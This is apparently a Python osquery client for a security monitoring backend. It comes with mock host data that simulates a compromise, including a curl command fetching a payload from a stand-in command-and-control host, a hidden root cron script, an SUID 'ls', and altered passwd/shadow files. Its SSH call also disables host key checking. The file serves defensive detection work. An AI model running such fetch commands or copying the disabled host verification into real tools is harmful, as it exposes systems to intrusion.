"""osquery client supporting SSH and mock transports."""

import asyncio
import json
import logging
from typing import Any

from backend.app.config import settings

logger = logging.getLogger(__name__)

_MOCK_DATA: dict[str, list[dict[str, Any]]] = {
    "running_processes": [
        {"pid": "1", "name": "systemd", "path": "/usr/lib/systemd/systemd",
         "cmdline": "/sbin/init", "uid": "0", "start_time": "1712300000"},
        {"pid": "512", "name": "sshd", "path": "/usr/sbin/sshd",
         "cmdline": "/usr/sbin/sshd -D", "uid": "0", "start_time": "1712300010"},
        {"pid": "1024", "name": "nginx", "path": "/usr/sbin/nginx",
         "cmdline": "nginx: master process", "uid": "0", "start_time": "1712300020"},
        {"pid": "2048", "name": "curl", "path": "/usr/bin/curl",
         "cmdline": "curl http://malicious-c2.example.com/payload.sh",
         "uid": "1000", "start_time": "1712435700"},
        {"pid": "3001", "name": "python3", "path": "/usr/bin/python3",
         "cmdline": "python3 -c 'import socket'", "uid": "1000", "start_time": "1712435800"},
    ],
    "open_connections": [
        {"pid": "512", "local_address": "0.0.0.0", "local_port": "22",
         "remote_address": "203.0.113.42", "remote_port": "44231",
         "state": "ESTABLISHED", "protocol": "6"},
        {"pid": "1024", "local_address": "0.0.0.0", "local_port": "80",
         "remote_address": "198.51.100.77", "remote_port": "54321",
         "state": "ESTABLISHED", "protocol": "6"},
        {"pid": "2048", "local_address": "10.128.0.35", "local_port": "48210",
         "remote_address": "93.184.216.34", "remote_port": "80",
         "state": "ESTABLISHED", "protocol": "6"},
    ],
    "listening_ports": [
        {"pid": "512", "port": "22", "protocol": "6", "address": "0.0.0.0"},
        {"pid": "1024", "port": "80", "protocol": "6", "address": "0.0.0.0"},
        {"pid": "1024", "port": "443", "protocol": "6", "address": "0.0.0.0"},
    ],
    "logged_in_users": [
        {"user": "root", "host": "10.128.0.29", "time": "1712430000",
         "tty": "pts/0", "type": "user"},
        {"user": "developer", "host": "10.128.0.29", "time": "1712434000",
         "tty": "pts/1", "type": "user"},
        {"user": "webadmin", "host": "203.0.113.42", "time": "1712435122",
         "tty": "pts/2", "type": "user"},
    ],
    "crontabs": [
        {"command": "/usr/bin/logrotate /etc/logrotate.conf", "path": "/etc/crontab",
         "minute": "0", "hour": "3", "day_of_month": "*", "month": "*",
         "day_of_week": "*"},
        {"command": "/tmp/.hidden/update.sh", "path": "/var/spool/cron/crontabs/root",
         "minute": "*/5", "hour": "*", "day_of_month": "*", "month": "*",
         "day_of_week": "*"},
    ],
    "suid_binaries": [
        {"path": "/usr/bin/sudo", "username": "root",
         "permissions": "4755", "directory": "/usr/bin"},
        {"path": "/usr/bin/passwd", "username": "root",
         "permissions": "4755", "directory": "/usr/bin"},
        {"path": "/usr/bin/ls", "username": "root",
         "permissions": "4755", "directory": "/usr/bin"},
    ],
    "file_events": [
        {"target_path": "/etc/passwd", "action": "UPDATED",
         "time": "1712435277", "category": "config"},
        {"target_path": "/etc/shadow", "action": "UPDATED",
         "time": "1712435277", "category": "config"},
    ],
}


class OsqueryError(Exception):
    """Raised when an osquery operation fails."""


class OsqueryClient:
    """Client for querying osquery on remote hosts.

    Supports two transports:
    - ``ssh``: runs ``osqueryi --json`` on the target host over SSH
    - ``mock``: returns built-in sample data for local development and evaluation
    """

    def __init__(self) -> None:
        self._transport = settings.osquery_transport
        self._ssh_user = settings.osquery_ssh_user
        self._ssh_key_path = settings.osquery_ssh_key_path
        self._ssh_timeout = settings.osquery_ssh_timeout

    async def query(self, host: str, sql: str) -> list[dict[str, Any]]:
        if self._transport == "mock":
            return self._mock_query(sql)
        elif self._transport == "ssh":
            return await self._ssh_query(host, sql)
        raise OsqueryError(f"Unknown transport: {self._transport}")

    def _mock_query(self, sql: str) -> list[dict[str, Any]]:
        """Return built-in mock data based on which table the query targets."""
        sql_lower = sql.lower()
        table_to_key = {
            "processes": "running_processes",
            "process_open_sockets": "open_connections",
            "listening_ports": "listening_ports",
            "logged_in_users": "logged_in_users",
            "crontab": "crontabs",
            "suid_bin": "suid_binaries",
            "file_events": "file_events",
        }
        for table_name, data_key in table_to_key.items():
            if table_name in sql_lower:
                return _MOCK_DATA.get(data_key, [])
        for data_key, data in _MOCK_DATA.items():
            if data_key in sql_lower:
                return data
        return []

    async def _ssh_query(self, host: str, sql: str) -> list[dict[str, Any]]:
        """Execute an osquery SQL query on a remote host via SSH."""
        cmd = ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5"]
        if self._ssh_key_path:
            cmd.extend(["-i", self._ssh_key_path])
        cmd.extend([
            f"{self._ssh_user}@{host}",
            "osqueryi", "--json", sql,
        ])

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(), timeout=self._ssh_timeout
            )
        except TimeoutError as exc:
            raise OsqueryError(f"SSH to {host} timed out after {self._ssh_timeout}s") from exc
        except OSError as exc:
            raise OsqueryError(f"SSH to {host} failed: {exc}") from exc

        if proc.returncode != 0:
            err_msg = stderr.decode(errors="replace").strip()
            raise OsqueryError(f"osquery on {host} returned code {proc.returncode}: {err_msg}")

        raw = stdout.decode(errors="replace").strip()
        if not raw:
            return []

        try:
            result = json.loads(raw)
            return result if isinstance(result, list) else []
        except json.JSONDecodeError:
            logger.warning("Non-JSON osquery output from %s: %s", host, raw[:200])
            return []

    async def is_available(self, host: str) -> bool:
        """Check whether osquery is reachable on the given host."""
        try:
            await self.query(host, "SELECT version() AS v")
            return True
        except OsqueryError:
            return False


osquery_client = OsqueryClient()
